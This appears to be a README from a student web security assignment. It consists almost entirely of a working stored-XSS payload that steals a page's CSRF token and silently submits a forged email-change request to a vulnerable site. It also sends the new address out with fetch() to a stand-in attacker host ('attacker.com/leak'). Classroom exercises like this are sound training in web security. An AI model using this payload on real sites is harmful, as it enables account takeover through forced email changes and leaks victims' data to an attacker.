# WebSecurity-CSRF
Web Security Assignment on CSRF


# Script that will exploit the stored XSS vulnerability and trigger a CSRF

<form id="fake_form" action="http://www.vulnerable.com:5000/profile/update-email" method="POST"> 
  <input id="my_mail" name="email" value=""> 
  <input id="my_csrf" name="csrf" value=""> 
</form> 

<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    let new_mail = rndMail()
    document.getElementById("my_mail").value = new_mail
    document.getElementById("my_csrf").value = stolen_csrf;

    //attackers logging
    let url = "http://www.attacker.com:5000/leak?newmail=" + new_mail; 
    fetch(url, {method: "GET", mode: "no-cors"});


    let fakeForm = document.getElementById("fake_form")
    fakeForm.onsubmit = (event) => event.preventDefault();
    fakeForm.requestSubmit(); 
}
</script>
